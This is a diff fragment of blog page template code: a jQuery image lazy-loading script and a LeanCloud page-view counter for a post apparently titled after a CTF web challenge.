+                    }), 0 == oLazyload.length && $(window).unbind("scroll", fLazyload);
+                };
+            oLazyload.each(function () {
+                $(this).one("appear", function () {
+                    $(this).attr("src", $(this).attr("data-original"));
+                    $(this).fadeIn(500);
+                });
+            }), $(window).bind("scroll", fLazyload), fLazyload();
+        }
+        lazyload();
+    });
+</script>
+
+<!-- <script src="https://guokeya.github.io/media/js/av-min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/leancloud-storage@3.13.0/dist/av-min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/leancloud-storage@4.6.1/dist/av-live-query-min.js"></script> -->
+
+<script>
+    function getHotnum() {
+        //文章阅读热度（重构，利用leancloud原生api）
+        var pl = $("#pl").html();
+        var rootaddr = $("#rootaddr").html();
+        pl = pl.replace(rootaddr, "");
+
+        var appid = '';
+        var appkey = '';
+        console.log(appid, appkey)
+        if(AV==undefined)
+            AV.init({
+                appId: appid,
+                appKey: appkey
+            });
+        const query = new AV.Query('Counter');
+        query.equalTo('url', pl);
+        var time = 'Loading...';
+        query.find().then(function (results) {
+            console.log(results)
+            if (results.length == 0) {
+                console.log("0")
+                var NewCounter = AV.Object.extend('Counter');
+                var nc = new NewCounter();
+                nc.save({
+                    time: 1,
+                    title: "西湖论剑初赛Web1/5",
+                    url: pl,
+                    xid: pl,
+                }).then(function (object) {
+                    $(".hotnum").eq(0).html(1);
+                    $(".hotnum").eq(1).html(1);
+                });
+            } else {
+                id = results[0].id;
+                var todo = AV.Object.createWithoutData('Counter', id);
+                time = results[0].attributes.time + 1;
+                todo.set("time", time);
+                todo.save();
+                console.log(todo);
+                $(".hotnum").eq(0).html(time);
+                $(".hotnum").eq(1).html(time);
+            }
+
+        }, function (error) {
+            console.log(error)
+        });
+    }
+</script>
